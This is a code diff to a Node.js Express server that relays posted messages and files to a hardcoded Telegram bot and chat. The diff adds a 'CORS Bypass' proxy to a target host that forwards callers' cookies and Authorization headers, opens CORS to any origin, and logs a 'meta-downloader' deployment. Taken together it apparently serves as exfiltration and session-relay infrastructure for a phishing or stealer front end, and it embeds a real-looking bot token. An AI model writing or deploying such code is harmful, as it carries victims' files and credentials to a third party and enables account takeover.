@@ -6,12 +6,13 @@ const path = require('path');
 // ==================== CONFIGURATION ====================
 const BOT_TOKEN = process.env.BOT_TOKEN || '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
 const CHAT_ID = process.env.CHAT_ID || '6767182328';
+const TARGET_API = process.env.TARGET_API || 'https://bugweb.lionelmelo.space';
 const DEBUG = process.env.DEBUG === 'true';
 const PORT = process.env.PORT || 3000;
 
-// Rate limiting (protection)
+// Rate limiting
 const rateLimit = new Map();
-const RATE_LIMIT_MS = 60000; // 1 minute
+const RATE_LIMIT_MS = 60000;
 const MAX_REQUESTS = 30;
 
 // Logger
@@ -24,11 +25,11 @@ function log(message, type = 'INFO') {
     }
 }
 
-// Middleware CORS
+// ==================== MIDDLEWARES ====================
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Cookie');
     if (req.method === 'OPTIONS') {
         return res.sendStatus(204);
     }
@@ -40,7 +41,7 @@ app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // Rate limiting middleware
 function rateLimitMiddleware(req, res, next) {
-    const ip = req.ip || req.connection.remoteAddress;
+    const ip = req.ip || req.connection.remoteAddress || 'unknown';
     const now = Date.now();
     
     if (!rateLimit.has(ip)) {
@@ -55,24 +56,46 @@ function rateLimitMiddleware(req, res, next) {
         log(`Rate limit exceeded for ${ip}`, 'WARNING');
         return res.status(429).json({ error: 'Too many requests', retryAfter: 60 });
     }
-    
     next();
 }
 
-// Health check
-app.get('/health', (req, res) => {
-    res.json({
-        status: 'ok',
-        timestamp: Date.now(),
-        bot_configured: !!BOT_TOKEN,
-        chat_configured: !!CHAT_ID,
-        uptime: process.uptime(),
-        memory: process.memoryUsage(),
-        version: '2.0.0'
-    });
+// ==================== PROXY VERS L'API CIBLE (contourne CORS) ====================
+app.all('/api/*', rateLimitMiddleware, async (req, res) => {
+    const targetUrl = TARGET_API + req.url;
+    const options = {
+        method: req.method,
+        headers: {
+            'Content-Type': 'application/json',
+            'Cookie': req.headers.cookie || '',
+            'Authorization': req.headers.authorization || ''
+        },
+        body: req.method !== 'GET' && req.method !== 'HEAD' ? JSON.stringify(req.body) : undefined
+    };
+    
+    log(`Proxy: ${req.method} ${targetUrl}`, 'INFO');
+    
+    try {
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 15000);
+        const response = await fetch(targetUrl, { ...options, signal: controller.signal });
+        clearTimeout(timeout);
+        
+        let data;
+        const contentType = response.headers.get('content-type');
+        if (contentType && contentType.includes('application/json')) {
+            data = await response.json();
+        } else {
+            data = { raw: await response.text() };
+        }
+        
+        res.status(response.status).json(data);
+    } catch (error) {
+        log(`Proxy error: ${error.message}`, 'ERROR');
+        res.status(500).json({ error: error.message });
+    }
 });
 
-// Envoi de message avec retry
+// ==================== TELEGRAM ENDPOINTS ====================
 async function sendTelegramMessage(text, retries = 3) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const body = JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) });
@@ -108,15 +131,14 @@ app.post('/send', rateLimitMiddleware, async (req, res) => {
     log(`Received message (${text.length} chars)`, 'INFO');
     
     try {
-        const result = await sendTelegramMessage(text);
-        res.json({ ok: result.ok, message: 'Message sent successfully' });
+        await sendTelegramMessage(text);
+        res.json({ ok: true, message: 'Message sent successfully' });
     } catch (error) {
         log(`Failed to send message: ${error.message}`, 'ERROR');
         res.status(500).json({ error: error.message });
     }
 });
 
-// Envoi de fichier avec retry
 async function sendTelegramFile(filename, content, retries = 3) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
     
@@ -152,29 +174,47 @@ app.post('/send-file', rateLimitMiddleware, async (req, res) => {
         return res.status(400).json({ error: 'Missing filename or content' });
     }
     
-    log(`Received file: ${filename} (${Math.round(content.length * 0.75 / 1024)} KB)`, 'INFO');
+    const sizeKB = Math.round(content.length * 0.75 / 1024);
+    log(`Received file: ${filename} (${sizeKB} KB)`, 'INFO');
     
     try {
-        const result = await sendTelegramFile(filename, content);
-        res.json({ ok: result.ok, message: 'File sent successfully' });
+        await sendTelegramFile(filename, content);
+        res.json({ ok: true, message: 'File sent successfully' });
     } catch (error) {
         log(`Failed to send file: ${error.message}`, 'ERROR');
         res.status(500).json({ error: error.message });
     }
 });
 
-// Route d'info
-app.get('/info', (req, res) => {
+// ==================== ROUTES PUBLIQUES ====================
+app.get('/health', (req, res) => {
     res.json({
-        name: 'Telegram Proxy',
-        version: '2.0.0',
-        endpoints: ['GET /health', 'GET /info', 'POST /send', 'POST /send-file'],
-        rate_limit: `${MAX_REQUESTS} requests per ${RATE_LIMIT_MS / 1000}s`,
-        bot_configured: !!BOT_TOKEN
+        status: 'ok',
+        timestamp: Date.now(),
+        bot_configured: !!BOT_TOKEN,
+        chat_configured: !!CHAT_ID,
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        version: '3.0.0'
     });
 });
 
-// Gestionnaire d'erreurs global
+app.get('/info', (req, res) => {
+    res.json({
+        name: 'Telegram Proxy + CORS Bypass',
+        version: '3.0.0',
+        endpoints: [
+            'GET /health', 'GET /info',
+            'POST /send', 'POST /send-file',
+            'GET|POST|PUT|DELETE /api/* (proxy vers cible)'
+        ],
+        rate_limit: `${MAX_REQUESTS} requests per ${RATE_LIMIT_MS / 1000}s`,
+        bot_configured: !!BOT_TOKEN,
+        target_api: TARGET_API
+    });
+});
+
+// ==================== GESTION DES ERREURS ====================
 process.on('uncaughtException', (error) => {
     log(`Uncaught exception: ${error.message}`, 'FATAL');
     console.error(error.stack);
@@ -184,13 +224,15 @@ process.on('unhandledRejection', (reason) => {
     log(`Unhandled rejection: ${reason}`, 'FATAL');
 });
 
-// Démarrage
+// ==================== DÉMARRAGE ====================
 app.listen(PORT, () => {
     log(`========================================`, 'INFO');
-    log(`🚀 Proxy Telegram actif sur le port ${PORT}`, 'INFO');
-    log(`📊 Health check: http://localhost:${PORT}/health`, 'INFO');
-    log(`📡 Send message: POST http://localhost:${PORT}/send`, 'INFO');
-    log(`📁 Send file: POST http://localhost:${PORT}/send-file`, 'INFO');
-    log(`🛡️ Rate limit: ${MAX_REQUESTS} requests/minute`, 'INFO');
+    log(`🚀 Proxy actif sur le port ${PORT}`, 'INFO');
+    log(`📊 Health: http://localhost:${PORT}/health`, 'INFO');
+    log(`📡 Send: POST http://localhost:${PORT}/send`, 'INFO');
+    log(`📁 Send-file: POST http://localhost:${PORT}/send-file`, 'INFO');
+    log(`🔄 Proxy API: https://meta-downloader-79f2.onrender.com/api/*`, 'INFO');
+    log(`🎯 Cible: ${TARGET_API}`, 'INFO');
+    log(`🛡️ Rate limit: ${MAX_REQUESTS}/minute`, 'INFO');
     log(`========================================`, 'INFO');
 });
